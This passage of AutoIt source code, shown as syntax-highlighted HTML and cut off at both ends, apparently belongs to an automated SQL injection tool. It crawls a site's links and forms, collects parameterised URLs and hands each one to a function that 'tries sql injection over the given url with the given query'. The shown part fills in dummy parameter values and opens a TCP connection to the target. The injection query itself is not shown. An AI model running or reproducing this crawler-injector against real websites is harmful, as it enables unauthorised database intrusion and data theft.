                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$param_value</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">]),</span><span class="sc7">"&lt;select"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                        </span><span class="sc9">$o</span><span class="sc8">=</span><span class="sc9">$ln</span><span class="sc0">
                        </span><span class="sc5">Do</span><span class="sc0">
                            </span><span class="sc9">$o</span><span class="sc8">=</span><span class="sc9">$o</span><span class="sc8">+</span><span class="sc3">1</span><span class="sc0">
                            </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$o</span><span class="sc8">]),</span><span class="sc7">"&lt;option"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                                </span><span class="sc9">$param_value</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> GetOption</span><span class="sc8">(</span><span class="sc7">"value"</span><span class="sc8">,</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$o</span><span class="sc8">])</span><span class="sc0">
                            </span><span class="sc5">EndIf</span><span class="sc0">
                        </span><span class="sc5">Until</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$param_value</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc9">$o</span><span class="sc8">&gt;=(</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]-</span><span class="sc9">$ln</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0">
                    </span><span class="sc5">EndIf</span><span class="sc0">
                    </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$param_value</span><span class="sc0">
                </span><span class="sc5">endif</span><span class="sc0">
            </span><span class="sc5">endif</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">]),</span><span class="sc7">"&lt;/form"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0">  </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc9">$bWritingUrl</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
                </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$new_url</span><span class="sc8">)</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInstr</span><span class="sc8">(</span><span class="sc0">Strip</span><span class="sc8">(</span><span class="sc9">$sVectors</span><span class="sc8">,</span><span class="sc7">"="</span><span class="sc8">,</span><span class="sc7">"&amp;"</span><span class="sc8">),</span><span class="sc0">Strip</span><span class="sc8">(</span><span class="sc9">$new_url</span><span class="sc8">,</span><span class="sc7">"="</span><span class="sc8">,</span><span class="sc7">"&amp;"</span><span class="sc8">))=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$new_url</span><span class="sc8">,</span><span class="sc3">7</span><span class="sc8">)&lt;&gt;</span><span class="sc7">"http://"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                        </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sRoot</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$new_url</span><span class="sc0">
                    </span><span class="sc5">EndIf</span><span class="sc0"> 
                    </span><span class="sc9">$sVectors</span><span class="sc0"> </span><span class="sc8">&amp;=</span><span class="sc0"> </span><span class="sc6">@lf</span><span class="sc8">&amp;</span><span class="sc9">$new_url</span><span class="sc8">&amp;</span><span class="sc7">"#"</span><span class="sc8">&amp;</span><span class="sc9">$new_url_method</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> SQLInjection</span><span class="sc8">(</span><span class="sc9">$new_url</span><span class="sc8">,</span><span class="sc9">$sSQLInjectionQuery</span><span class="sc8">,</span><span class="sc9">$new_url_method</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                        </span><span class="sc5">Return</span><span class="sc0"> True
                    </span><span class="sc5">endif</span><span class="sc0">
                </span><span class="sc5">EndIf</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInstr</span><span class="sc8">(</span><span class="sc9">$sOldLinks</span><span class="sc8">,</span><span class="sc9">$new_url</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> </span><span class="sc4">StringInstr</span><span class="sc8">(</span><span class="sc9">$sSessionLinks</span><span class="sc8">,</span><span class="sc9">$new_url</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$new_url</span><span class="sc8">,</span><span class="sc3">7</span><span class="sc8">)&lt;&gt;</span><span class="sc7">"http://"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                        </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sRoot</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$new_url</span><span class="sc0">
                    </span><span class="sc5">EndIf</span><span class="sc0">
                    </span><span class="sc9">$sSessionLinks</span><span class="sc0"> </span><span class="sc8">&amp;=</span><span class="sc0"> </span><span class="sc9">$new_url</span><span class="sc8">&amp;</span><span class="sc7">"#"</span><span class="sc8">&amp;</span><span class="sc9">$new_url_method</span><span class="sc8">&amp;</span><span class="sc6">@lf</span><span class="sc0">
                </span><span class="sc5">EndIf</span><span class="sc0">
                </span><span class="sc9">$new_url</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
                </span><span class="sc9">$new_url_method</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
                </span><span class="sc9">$bWritingUrl</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> false
            </span><span class="sc5">endif</span><span class="sc0">
            </span><span class="sc9">$Address</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> GetOption</span><span class="sc8">(</span><span class="sc7">"href"</span><span class="sc8">,</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">])</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc5">Then</span><span class="sc0">
                </span><span class="sc9">$Address</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> GetOption</span><span class="sc8">(</span><span class="sc7">"src"</span><span class="sc8">,</span><span class="sc9">$CodeLines</span><span class="sc8">[</span><span class="sc9">$ln</span><span class="sc8">])</span><span class="sc0">
            </span><span class="sc5">EndIf</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&gt;</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">,</span><span class="sc7">"javascript:"</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc5">Then</span><span class="sc0">
                </span><span class="sc9">$Address</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">)</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">,</span><span class="sc7">"="</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> </span><span class="sc4">StringInstr</span><span class="sc8">(</span><span class="sc0">Strip</span><span class="sc8">(</span><span class="sc9">$sVectors</span><span class="sc8">,</span><span class="sc7">"="</span><span class="sc8">,</span><span class="sc7">"&amp;"</span><span class="sc8">),</span><span class="sc0">Strip</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">,</span><span class="sc7">"="</span><span class="sc8">,</span><span class="sc7">"&amp;"</span><span class="sc8">))=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">,</span><span class="sc3">7</span><span class="sc8">)&lt;&gt;</span><span class="sc7">"http://"</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                        </span><span class="sc9">$Address</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sRoot</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$Address</span><span class="sc0">
                    </span><span class="sc5">EndIf</span><span class="sc0">
                    </span><span class="sc9">$sVectors</span><span class="sc0"> </span><span class="sc8">&amp;=</span><span class="sc0"> </span><span class="sc6">@lf</span><span class="sc8">&amp;</span><span class="sc9">$Address</span><span class="sc8">&amp;</span><span class="sc7">"#GET"</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> SQLInjection</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">,</span><span class="sc9">$sSQLInjectionQuery</span><span class="sc8">,</span><span class="sc7">"GET"</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                        </span><span class="sc5">Return</span><span class="sc0"> True
                    </span><span class="sc5">EndIf</span><span class="sc0">
                </span><span class="sc5">endif</span><span class="sc0">
                </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringlower</span><span class="sc8">(</span><span class="sc0">GetResourceExtension</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">))</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc9">$ext</span><span class="sc8">=</span><span class="sc7">""</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc8">=</span><span class="sc7">"htm"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc8">=</span><span class="sc7">"html"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc8">=</span><span class="sc7">"php"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc8">=</span><span class="sc7">"asp"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc8">=</span><span class="sc7">"jsp"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc8">=</span><span class="sc7">"aspx"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc8">=</span><span class="sc7">"jspx"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc8">=</span><span class="sc7">"pl"</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc8">=</span><span class="sc7">"cgi"</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInstr</span><span class="sc8">(</span><span class="sc9">$sOldLinks</span><span class="sc8">,</span><span class="sc9">$Address</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> </span><span class="sc4">StringInstr</span><span class="sc8">(</span><span class="sc9">$sSessionLinks</span><span class="sc8">,</span><span class="sc9">$Address</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">,</span><span class="sc3">7</span><span class="sc8">)&lt;&gt;</span><span class="sc7">"http://"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                            </span><span class="sc9">$Address</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sRoot</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$Address</span><span class="sc0">
                        </span><span class="sc5">EndIf</span><span class="sc0">
                        </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$addrserv</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringlower</span><span class="sc8">(</span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$Address</span><span class="sc8">,</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sRoot</span><span class="sc8">)))</span><span class="sc0">
                        </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$newserv</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringsplit</span><span class="sc8">(</span><span class="sc9">$addrserv</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
                        </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$myserv</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringsplit</span><span class="sc8">(</span><span class="sc9">$sRoot</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
                        </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">stringlower</span><span class="sc8">(</span><span class="sc9">$newserv</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">])=</span><span class="sc4">stringlower</span><span class="sc8">(</span><span class="sc9">$myserv</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">])</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc9">$newserv</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">]=</span><span class="sc0">TCPNameToIP</span><span class="sc8">(</span><span class="sc9">$myserv</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">])</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> TCPNameToIP</span><span class="sc8">(</span><span class="sc9">$newserv</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">])=</span><span class="sc9">$myserv</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                            </span><span class="sc9">$sSessionLinks</span><span class="sc0"> </span><span class="sc8">&amp;=</span><span class="sc0"> </span><span class="sc9">$Address</span><span class="sc8">&amp;</span><span class="sc6">@lf</span><span class="sc0">
                        </span><span class="sc5">EndIf</span><span class="sc0">
                    </span><span class="sc5">endif</span><span class="sc0">
                </span><span class="sc5">endif</span><span class="sc0">
            </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc5">Next</span><span class="sc0">
    </span><span class="sc5">Return</span><span class="sc0"> False
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> SQLInjection</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">,</span><span class="sc9">$sQuery</span><span class="sc8">,</span><span class="sc9">$sMethod</span><span class="sc8">)</span><span class="sc1">;tries sql injection over the given url with the given query</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$s</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$sServer</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$nPort</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">80</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sQuery</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0"> False
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sMethod</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc9">$sMethod</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"GET"</span><span class="sc0">
    </span><span class="sc9">$url_parts</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringSplit</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$sServer</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$url_parts</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">]</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">,</span><span class="sc7">":"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
        </span><span class="sc9">$nPort</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Int</span><span class="sc8">(</span><span class="sc4">StringMid</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">,</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">,</span><span class="sc7">":"</span><span class="sc8">)+</span><span class="sc3">1</span><span class="sc8">))</span><span class="sc0">
        </span><span class="sc9">$sServer</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">,</span><span class="sc0">IndexOf</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">,</span><span class="sc7">":"</span><span class="sc8">,</span><span class="sc0">false</span><span class="sc8">))</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc9">$url_parts</span><span class="sc8">[</span><span class="sc3">1</span><span class="sc8">]=</span><span class="sc7">""</span><span class="sc0">
    </span><span class="sc9">$url_parts</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">]=</span><span class="sc7">""</span><span class="sc0">
    </span><span class="sc9">$sVect</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> join</span><span class="sc8">(</span><span class="sc9">$url_parts</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$sVect</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$sParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">,</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">)-</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">))</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sParams</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc9">$sParams</span><span class="sc8">=</span><span class="sc9">$sVect</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0"> False
    </span><span class="sc9">$sVect</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">,</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sVect</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">))</span><span class="sc0">
    </span><span class="sc9">$sParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sParams</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"&amp;"</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sParams</span><span class="sc8">,</span><span class="sc7">"=&amp;"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
        </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$sTmpParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
        </span><span class="sc9">$TmpParam</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringsplit</span><span class="sc8">(</span><span class="sc9">$sParams</span><span class="sc8">,</span><span class="sc7">"=&amp;"</span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$t</span><span class="sc8">=</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">To</span><span class="sc0"> </span><span class="sc9">$TmpParam</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]-</span><span class="sc3">1</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$TmpParam</span><span class="sc8">[</span><span class="sc9">$t</span><span class="sc8">])&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                </span><span class="sc9">$sTmpParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sTmpParams</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$TmpParam</span><span class="sc8">[</span><span class="sc9">$t</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"=12345"</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$TmpParam</span><span class="sc8">[</span><span class="sc9">$t</span><span class="sc8">]),</span><span class="sc7">"mail"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
                    </span><span class="sc9">$sTmpParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sTmpParams</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"@a.aa"</span><span class="sc0">
                </span><span class="sc5">EndIf</span><span class="sc0">
                </span><span class="sc9">$sTmpParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sTmpParams</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"&amp;"</span><span class="sc0">
            </span><span class="sc5">EndIf</span><span class="sc0">
        </span><span class="sc5">Next</span><span class="sc0">
        </span><span class="sc9">$sTmpParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$sTmpParams</span><span class="sc8">,</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sTmpParams</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
        </span><span class="sc9">$sParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sTmpParams</span><span class="sc0">
    </span><span class="sc5">Else</span><span class="sc0">
        </span><span class="sc9">$sParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$sParams</span><span class="sc8">,</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sParams</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">EndIf</span><span class="sc0">
    </span><span class="sc9">$sVect</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sVect</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sParams</span><span class="sc0">
    </span><span class="sc9">$sParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringReplace</span><span class="sc8">(</span><span class="sc9">$sParams</span><span class="sc8">,</span><span class="sc7">"="</span><span class="sc8">,</span><span class="sc6">@lf</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$sParams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringReplace</span><span class="sc8">(</span><span class="sc9">$sParams</span><span class="sc8">,</span><span class="sc7">"&amp;"</span><span class="sc8">,</span><span class="sc6">@lf</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$Param</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringsplit</span><span class="sc8">(</span><span class="sc9">$sParams</span><span class="sc8">,</span><span class="sc6">@lf</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$s</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> TCPConnect</span><span class="sc8">(</span><span class="sc0">TCPNameToIP</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">),</span><span class="sc9">$nPort</span><span class="sc8">)</span><span class="sc0">
